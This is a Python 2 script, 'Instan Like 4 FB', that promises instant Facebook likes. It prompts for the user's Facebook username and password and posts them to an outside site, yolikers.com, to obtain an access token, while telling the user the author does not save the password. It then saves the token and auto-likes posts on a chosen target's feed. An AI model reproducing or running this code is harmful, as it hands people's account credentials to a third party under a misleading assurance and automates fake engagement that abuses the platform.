# Name: Instan Like 4 FB
# 08-08-2019
# Coded by: SalisM3

def login():
	import requests as r, json, time, os
	from bs4 import BeautifulSoup as parser
	os.system('clear')
	h = '\033[92m'
	k = '\033[93m'
	m = '\033[91m'
	p = '\033[0m'
	print h + "Instan Like For FB\nCoded by: SalisM3\n" + p
	print "[+] Login To Your Account\n[+] Author No Save Your Password"
	u = raw_input('[?] Username: ')
	pw = raw_input('[?] Password: ')
	print "[+] Sedang Login ...."
	get = r.post('https://yolikers.com:443/tokenmess.php', data={'u':u, 'p':pw}).text
	soup = parser(get, 'html.parser')
	link = soup.find('iframe').get('src')
	get_token = r.get(link).text
	if "session_key" in get_token:
		tuken = json.loads(get_token)
		open('token.txt', 'w').write(tuken['access_token'])
		print "[+] Login Sukses"
		time.sleep(2)
		main()
	elif "unavailable" in get_token:
		print "[+] Generate Failed! Your Account Checkpoint"
		exit()
	else:
		print "[+] Wrong Username/Password"
		exit()

def main():
	try:
		import requests as r, json, time, os
		from bs4 import BeautifulSoup as parser
		os.system('clear')
		h = '\033[92m'
		k = '\033[93m'
		m = '\033[91m'
		p = '\033[0m'
		print h + "Instan Like For FB\nCoded by: SalisM3\n" + p
		token = open('token.txt').read()
		cek = r.get('https://graph.facebook.com/me?access_token='+token).text
		if "error" in cek:
			login()
		else:
			pass
		print "[+] Login as " + h + json.loads(cek)['name'] + p
		id = raw_input('[?] Target Id: ')
		batas = int(input('[?] Jumlah Status Yg Akan Disukai: '))
		data = r.get('https://graph.facebook.com/'+id+'/feed?access_token='+token+'&fields=id&limit='+str(batas)).text
		if "error" in data:
			print "[+] Invalid Id"
			exit()
		else:
			pass
		a = json.loads(data)
		print ""
		for s in a['data']:
			b = r.post('https://graph.facebook.com/'+s['id']+'/likes?access_token='+token).text
			time.sleep(1)
			if "true" in b:
				print h + "[OK] " + p + s['id']
			else:
				print m + "[FL] " + p + s['id']
		print "\nDone!"
		exit()
		
	except ImportError:
		print "[+] need module requests and bs4"
	except IOError:
		login()
	except r.exceptions.ConnectionError:
		print "[+] Koneksi Error"
	except KeyboardInterrupt:
		print "[+] Exit: Ok"
	except NameError:
		main()
	except ImportError:
		print "[+] need module requests and bs4"
	

main()
